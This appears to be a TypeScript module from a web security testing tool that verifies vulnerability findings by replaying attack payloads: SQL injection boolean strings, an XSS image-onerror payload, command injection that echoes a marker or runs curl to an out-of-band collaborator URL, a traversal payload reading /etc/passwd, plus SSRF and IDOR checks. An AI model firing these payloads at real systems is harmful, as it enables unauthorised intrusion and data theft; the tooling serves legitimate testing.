/**
 * Deterministic verification oracles. These are best-effort, category-specific
 * checks that turn a lead into a reproduced (or not reproduced) finding.
 */

import { randomBytes } from "node:crypto"
import type { Assertion, Finding, HttpEvidence, Verification } from "./types"
import { contextFor, httpRequest, truncate } from "./http"
import { loadAuth } from "./auth"
import { pollCollaborator } from "./oast"

export interface VerifyOptions {
  workspace: string
  category?: string
  payload?: string
  identity?: string
  oastUrl?: string
  oastToken?: string
  timeoutMs?: number
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

function token(prefix: string): string {
  return `${prefix}${randomBytes(5).toString("hex")}`
}

function normalizeCategory(value: string): string {
  return value.toLowerCase().replace(/[^a-z0-9]+/g, "_")
}

function isTraversal(category: string): boolean {
  return /traversal|lfi|path/.test(category)
}

function isRedirect(category: string): boolean {
  return /redirect/.test(category)
}

function safeHeaders(headers: Record<string, string> | undefined): Record<string, string> {
  const result: Record<string, string> = {}
  for (const [key, value] of Object.entries(headers ?? {})) {
    if (/^(host|content-length|connection|transfer-encoding)$/i.test(key)) continue
    result[key] = value
  }
  return result
}

export function buildRequest(
  finding: Finding,
  payload: string,
  options: VerifyOptions = { workspace: "" },
): { url: string; method: string; headers: Record<string, string>; body?: string } {
  const base = finding.evidence.request?.url ?? finding.endpoint ?? finding.target
  const method = (finding.method ?? finding.evidence.request?.method ?? "GET").toUpperCase()
  const headers = safeHeaders(finding.evidence.request?.requestHeaders)
  let url = base
  let body = finding.evidence.request?.requestBody

  if (url.includes("{{payload}}")) {
    url = url.split("{{payload}}").join(payload)
  } else if (method === "GET" || method === "HEAD") {
    if (finding.parameter) {
      try {
        const parsed = new URL(url)
        parsed.searchParams.set(finding.parameter, payload)
        url = parsed.toString()
      } catch {
        url = `${url}${url.includes("?") ? "&" : "?"}${encodeURIComponent(finding.parameter)}=${encodeURIComponent(payload)}`
      }
    } else if (isTraversal(normalizeCategory(finding.category)) || isRedirect(normalizeCategory(finding.category))) {
      url = `${url.replace(/\/+$/, "")}/${payload.replace(/^\/+/, "")}`
    }
  }

  if (body?.includes("{{payload}}")) {
    body = body.split("{{payload}}").join(payload)
  } else if (body && finding.parameter) {
    try {
      const parsed = JSON.parse(body)
      if (parsed && typeof parsed === "object") {
        parsed[finding.parameter] = payload
        body = JSON.stringify(parsed)
      }
    } catch {
      body = `${body}${body.includes("&") ? "&" : ""}${encodeURIComponent(finding.parameter)}=${encodeURIComponent(payload)}`
    }
  } else if (!body && finding.parameter && ["POST", "PUT", "PATCH"].includes(method)) {
    body = `${encodeURIComponent(finding.parameter)}=${encodeURIComponent(payload)}`
    headers["content-type"] = headers["content-type"] ?? "application/x-www-form-urlencoded"
  }

  return { url, method, headers, body }
}

function baseVerification(method: string, status: Verification["status"], summary: string): Verification {
  return { status, method, summary, assertions: [], verifiedAt: new Date().toISOString() }
}

function evidenceOf(...items: Array<HttpEvidence | undefined>): HttpEvidence[] {
  return items.filter((item): item is HttpEvidence => Boolean(item))
}

function lengthDelta(a: string, b: string): number {
  return Math.abs(a.length - b.length)
}

const SQL_ERROR =
  /(sql syntax|mysql_fetch|mysqli?_|postgresql|pg_query|ora-\d{4,5}|sqlite|unclosed quotation|quoted string not properly terminated|warning.*mysql|syntax error at or near)/i

async function verifySqli(finding: Finding, options: VerifyOptions): Promise<Verification> {
  const ctx = contextFor(options.workspace)
  const basePayload = options.payload ?? "1"
  const truePayload = `${basePayload}' AND '1'='1`
  const falsePayload = `${basePayload}' AND '1'='2`
  const baseline = buildRequest(finding, basePayload, options)
  const truthy = buildRequest(finding, truePayload, options)
  const falsy = buildRequest(finding, falsePayload, options)
  const [base, yes, no] = await Promise.all([
    httpRequest(ctx, { ...baseline, identity: options.identity, timeoutMs: options.timeoutMs }),
    httpRequest(ctx, { ...truthy, identity: options.identity, timeoutMs: options.timeoutMs }),
    httpRequest(ctx, { ...falsy, identity: options.identity, timeoutMs: options.timeoutMs }),
  ])
  if (!base.ok || !yes.ok || !no.ok) {
    const result = baseVerification("boolean-sqli", "error", base.error ?? yes.error ?? no.error ?? "request failed")
    result.evidence = evidenceOf(base.evidence, yes.evidence, no.evidence)
    return result
  }
  const assertions: Assertion[] = []
  const statusDiff = yes.evidence.status !== no.evidence.status
  const lengthDiff = lengthDelta(yes.bodyText, no.bodyText) > 20
  const errorSignature = SQL_ERROR.test(no.bodyText) || SQL_ERROR.test(yes.bodyText)
  assertions.push({
    kind: "boolean_status",
    expected: "different status for true vs false condition",
    actual: `${yes.evidence.status} vs ${no.evidence.status}`,
    passed: statusDiff,
  })
  assertions.push({
    kind: "boolean_length",
    expected: ">20 byte difference for true vs false condition",
    actual: lengthDelta(yes.bodyText, no.bodyText),
    passed: lengthDiff,
  })
  assertions.push({
    kind: "error_signature",
    expected: "SQL error signature in a response",
    actual: errorSignature ? "matched" : "not matched",
    passed: errorSignature,
  })
  const signals = [statusDiff, lengthDiff, errorSignature].filter(Boolean).length
  const reproduced = signals >= 2 || (errorSignature && (statusDiff || lengthDiff))
  const result = baseVerification(
    "boolean-sqli",
    reproduced ? "reproduced" : "not_reproduced",
    reproduced
      ? `SQL injection reproduced: ${signals}/3 boolean/error signals matched.`
      : `No SQL injection reproduced: ${signals}/3 signals matched.`,
  )
  result.assertions = assertions
  result.evidence = evidenceOf(base.evidence, yes.evidence, no.evidence)
  return result
}

async function verifyXss(finding: Finding, options: VerifyOptions): Promise<Verification> {
  const ctx = contextFor(options.workspace)
  const marker = token("glx")
  const payload = options.payload ?? `<img src=x onerror=alert('${marker}')>`
  const request = buildRequest(finding, payload, options)
  const response = await httpRequest(ctx, { ...request, identity: options.identity, timeoutMs: options.timeoutMs })
  if (!response.ok) {
    const result = baseVerification("reflected-xss", "error", response.error ?? "request failed")
    result.evidence = evidenceOf(response.evidence)
    return result
  }
  const body = response.bodyText
  const reflected = body.includes(marker)
  const unescaped = /<img[^>]+onerror\s*=/i.test(body) || /<script[^>]*>\s*alert\(/i.test(body)
  const contentType = (response.headers["content-type"] ?? "").toLowerCase()
  const html = contentType.includes("html") || /<html|<body|<div/i.test(body)
  const assertions: Assertion[] = [
    { kind: "token_reflected", expected: "marker appears in the response", actual: reflected, passed: reflected },
    { kind: "html_context", expected: "HTML content type or markup", actual: contentType || "unknown", passed: html },
    { kind: "unescaped_payload", expected: "payload is not HTML-escaped", actual: unescaped, passed: unescaped },
  ]
  const result = baseVerification(
    "reflected-xss",
    reflected && unescaped && html ? "reproduced" : reflected ? "not_reproduced" : "not_reproduced",
    reflected && unescaped && html
      ? "Payload reflected unescaped in an HTML response. Execution in a real browser is not proven by this oracle."
      : reflected
        ? "Payload reflected but escaped or outside an HTML context; no XSS proven."
        : "Payload was not reflected in the response.",
  )
  result.assertions = assertions
  result.evidence = evidenceOf(response.evidence)
  return result
}

async function verifySsrf(finding: Finding, options: VerifyOptions): Promise<Verification> {
  const ctx = contextFor(options.workspace)
  if (!options.oastUrl || !options.oastToken) {
    return baseVerification(
      "oast-ssrf",
      "inconclusive",
      "SSRF callback proof needs both the collaborator URL and its token; open the collaborator tool first.",
    )
  }
  const payload = options.payload ?? options.oastUrl
  const request = buildRequest(finding, payload, options)
  const response = await httpRequest(ctx, { ...request, identity: options.identity, timeoutMs: options.timeoutMs })
  if (!response.ok) {
    const result = baseVerification("oast-ssrf", "error", response.error ?? "request failed")
    result.evidence = evidenceOf(response.evidence)
    return result
  }
  await sleep(1200)
  const hits = options.oastToken ? pollCollaborator(options.workspace, options.oastToken) : []
  const matched = hits.length > 0
  const result = baseVerification(
    "oast-ssrf",
    matched ? "reproduced" : "inconclusive",
    matched
      ? "Callback received: the target made an out-of-band HTTP request."
      : "No callback observed yet. The target may be unable to reach the collaborator, or the payload did not fire.",
  )
  result.assertions = [
    {
      kind: "callback_received",
      expected: "at least one HTTP hit on the collaborator",
      actual: hits.length,
      passed: matched,
    },
  ]
  result.evidence = evidenceOf(response.evidence)
  result.oastConfirmed = matched
  return result
}

async function verifyRce(finding: Finding, options: VerifyOptions): Promise<Verification> {
  const ctx = contextFor(options.workspace)
  const marker = token("glr")
  const payload = options.payload ?? `; echo ${marker}`
  const request = buildRequest(finding, payload, options)
  const response = await httpRequest(ctx, { ...request, identity: options.identity, timeoutMs: options.timeoutMs })
  if (!response.ok) {
    const result = baseVerification("command-injection", "error", response.error ?? "request failed")
    result.evidence = evidenceOf(response.evidence)
    return result
  }
  const output = response.bodyText.includes(marker)
  if (output) {
    const result = baseVerification("command-injection", "reproduced", "Command output marker appeared in the response.")
    result.assertions = [
      { kind: "command_output", expected: `response contains ${marker}`, actual: "matched", passed: true },
    ]
    result.evidence = evidenceOf(response.evidence)
    return result
  }
  if (options.oastToken && options.oastUrl) {
    const callbackRequest = buildRequest(finding, `; curl ${options.oastUrl}`, options)
    await httpRequest(ctx, { ...callbackRequest, identity: options.identity, timeoutMs: options.timeoutMs })
    await sleep(1200)
    const hits = pollCollaborator(options.workspace, options.oastToken)
    const result = baseVerification(
      "command-injection",
      hits.length ? "reproduced" : "inconclusive",
      hits.length
        ? "Out-of-band command execution callback received."
        : "No command output or callback observed; inconclusive.",
    )
    result.assertions = [
      { kind: "callback_received", expected: "at least one HTTP hit", actual: hits.length, passed: hits.length > 0 },
    ]
    result.evidence = evidenceOf(response.evidence)
    result.oastConfirmed = hits.length > 0
    return result
  }
  const result = baseVerification("command-injection", "not_reproduced", "No command output marker observed.")
  result.assertions = [
    { kind: "command_output", expected: `response contains ${marker}`, actual: "not found", passed: false },
  ]
  result.evidence = evidenceOf(response.evidence)
  return result
}

async function verifyTraversal(finding: Finding, options: VerifyOptions): Promise<Verification> {
  const ctx = contextFor(options.workspace)
  const payload = options.payload ?? "../../../../../../etc/passwd"
  const request = buildRequest(finding, payload, options)
  const response = await httpRequest(ctx, { ...request, identity: options.identity, timeoutMs: options.timeoutMs })
  if (!response.ok) {
    const result = baseVerification("path-traversal", "error", response.error ?? "request failed")
    result.evidence = evidenceOf(response.evidence)
    return result
  }
  const matched = /root:x:0:0:|daemon:x:1:1:|nobody:x:65534:/i.test(response.bodyText)
  const result = baseVerification(
    "path-traversal",
    matched ? "reproduced" : "not_reproduced",
    matched
      ? "The response contains the /etc/passwd signature."
      : "No /etc/passwd signature in the response.",
  )
  result.assertions = [
    {
      kind: "passwd_signature",
      expected: "root:x:0:0 or equivalent line",
      actual: matched ? "matched" : "not found",
      passed: matched,
    },
  ]
  result.evidence = evidenceOf(response.evidence)
  return result
}

async function verifyIdor(finding: Finding, options: VerifyOptions): Promise<Verification> {
  const ctx = contextFor(options.workspace)
  const profiles = loadAuth(options.workspace).profiles
  if (profiles.length < 2) {
    return baseVerification("cross-identity-idor", "inconclusive", "IDOR verification needs at least two auth profiles.")
  }
  const owner = finding.identities?.[0] ?? profiles[0]!.label
  const other = finding.identities?.[1] ?? profiles[1]!.label
  const request = buildRequest(finding, options.payload ?? "", options)
  const [first, second] = await Promise.all([
    httpRequest(ctx, { ...request, identity: owner, timeoutMs: options.timeoutMs }),
    httpRequest(ctx, { ...request, identity: other, timeoutMs: options.timeoutMs }),
  ])
  if (!first.ok || !second.ok) {
    const result = baseVerification("cross-identity-idor", "error", first.error ?? second.error ?? "request failed")
    result.evidence = evidenceOf(first.evidence, second.evidence)
    return result
  }
  const ownerOk = (first.evidence.status ?? 0) >= 200 && (first.evidence.status ?? 0) < 300 && first.bodyText.length > 0
  const otherDenied =
    (second.evidence.status ?? 0) === 401 ||
    (second.evidence.status ?? 0) === 403 ||
    (second.evidence.status ?? 0) === 404
  const significantlyDifferent = lengthDelta(first.bodyText, second.bodyText) > Math.max(40, first.bodyText.length * 0.3)
  const reproduced = ownerOk && (otherDenied || significantlyDifferent)
  const result = baseVerification(
    "cross-identity-idor",
    reproduced ? "reproduced" : "not_reproduced",
    reproduced
      ? `Owner (${owner}) received the resource and ${other} was denied or received a materially different response.`
      : `Owner access=${ownerOk}, other denied=${otherDenied}, materially different=${significantlyDifferent}.`,
  )
  result.assertions = [
    { kind: "owner_access", expected: "owner receives a 2xx response", actual: first.evidence.status, passed: ownerOk },
    { kind: "non_owner_denied", expected: "second identity is denied or sees different data", actual: second.evidence.status, passed: otherDenied || significantlyDifferent },
  ]
  result.evidence = evidenceOf(first.evidence, second.evidence)
  return result
}

async function verifyGeneric(finding: Finding, options: VerifyOptions): Promise<Verification> {
  const ctx = contextFor(options.workspace)
  const request = buildRequest(finding, options.payload ?? "", options)
  const response = await httpRequest(ctx, { ...request, identity: options.identity, timeoutMs: options.timeoutMs })
  if (!response.ok) {
    const result = baseVerification("replay", "error", response.error ?? "request failed")
    result.evidence = evidenceOf(response.evidence)
    return result
  }
  const expect = finding.evidence.expect
  if (!expect) {
    const result = baseVerification(
      "replay",
      "inconclusive",
      "No expect block on the finding. Add expect.status/contains/notContains to make the replay deterministic.",
    )
    result.evidence = evidenceOf(response.evidence)
    return result
  }
  const assertions: Assertion[] = []
  if (expect.status !== undefined) {
    assertions.push({
      kind: "http_status",
      expected: expect.status,
      actual: response.evidence.status,
      passed: response.evidence.status === expect.status,
    })
  }
  if (expect.contains !== undefined) {
    assertions.push({
      kind: "string_in_output",
      expected: expect.contains,
      actual: response.bodyText.includes(expect.contains) ? "matched" : "not found",
      passed: response.bodyText.includes(expect.contains),
    })
  }
  if (expect.notContains !== undefined) {
    assertions.push({
      kind: "string_not_in_output",
      expected: `absent: ${expect.notContains}`,
      actual: response.bodyText.includes(expect.notContains) ? "present" : "absent",
      passed: !response.bodyText.includes(expect.notContains),
    })
  }
  if (expect.maxLength !== undefined) {
    assertions.push({
      kind: "max_length",
      expected: `<= ${expect.maxLength}`,
      actual: response.bodyText.length,
      passed: response.bodyText.length <= expect.maxLength,
    })
  }
  const reproduced = assertions.length > 0 && assertions.every((item) => item.passed)
  const result = baseVerification(
    "replay",
    reproduced ? "reproduced" : "not_reproduced",
    reproduced ? "All declared replay assertions passed." : "One or more replay assertions failed.",
  )
  result.assertions = assertions
  result.evidence = evidenceOf(response.evidence)
  return result
}

export async function verifyFinding(finding: Finding, options: VerifyOptions): Promise<Verification> {
  const category = normalizeCategory(options.category ?? finding.category)
  try {
    if (/sqli|sql_injection/.test(category)) return await verifySqli(finding, options)
    if (/xss|cross_site_script/.test(category)) return await verifyXss(finding, options)
    if (/ssrf|server_side_request/.test(category)) return await verifySsrf(finding, options)
    if (/rce|command_injection|cmdi|code_injection/.test(category)) return await verifyRce(finding, options)
    if (/traversal|lfi|path_traversal/.test(category)) return await verifyTraversal(finding, options)
    if (/idor|bola|object_level|access_control/.test(category)) return await verifyIdor(finding, options)
    return await verifyGeneric(finding, options)
  } catch (error) {
    const result = baseVerification(category, "error", error instanceof Error ? error.message : String(error))
    return result
  }
}

export function verificationOutput(verification: Verification): string {
  const lines = [
    `Status: ${verification.status}`,
    `Method: ${verification.method}`,
    `Summary: ${verification.summary}`,
  ]
  if (verification.assertions.length) {
    lines.push("Assertions:")
    for (const assertion of verification.assertions) {
      lines.push(`  - ${assertion.passed ? "PASS" : "FAIL"} ${assertion.kind}: expected=${JSON.stringify(assertion.expected)} actual=${JSON.stringify(assertion.actual)}`)
    }
  }
  if (verification.evidence?.length) {
    lines.push("Evidence:")
    for (const item of verification.evidence) {
      lines.push(`  ${item.method ?? "GET"} ${item.url} -> ${item.status ?? "?"} (${item.durationMs ?? "?"}ms)`)
      const body = truncate(item.responseBody, 800)
      if (body) lines.push(`    ${body.replace(/\n/g, "\n    ")}`)
    }
  }
  return lines.join("\n")
}
